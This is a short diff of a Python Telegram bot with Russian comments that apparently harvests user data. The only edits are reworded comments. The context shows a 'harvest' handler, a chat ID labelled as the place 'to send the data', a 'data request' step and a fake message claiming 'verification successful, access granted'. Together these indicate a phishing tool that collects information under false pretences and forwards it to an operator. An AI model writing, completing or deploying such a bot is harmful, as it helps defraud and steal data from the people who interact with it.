@@ -7,7 +7,7 @@ logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s
 TOKEN = "API_ТОКЕН"  # api бота
 LOGS_CHAT_ID = "CHAT_ID"  # кому отправлять данные  
 
-# /start  
+# Обработчик /start  
 def start(update: Update, context: CallbackContext):  
     # Запрос данных 
     context.bot.send_message(  
@@ -26,7 +26,7 @@ def harvest(update: Update, context: CallbackContext):
         )  
         update.message.reply_text("✅ Верификация успешна. Доступ разрешен.")  
 
-# запуск бота  
+# Запуск бота  
 def main():  
     updater = Updater(TOKEN, use_context=True)  
     dp = updater.dispatcher  
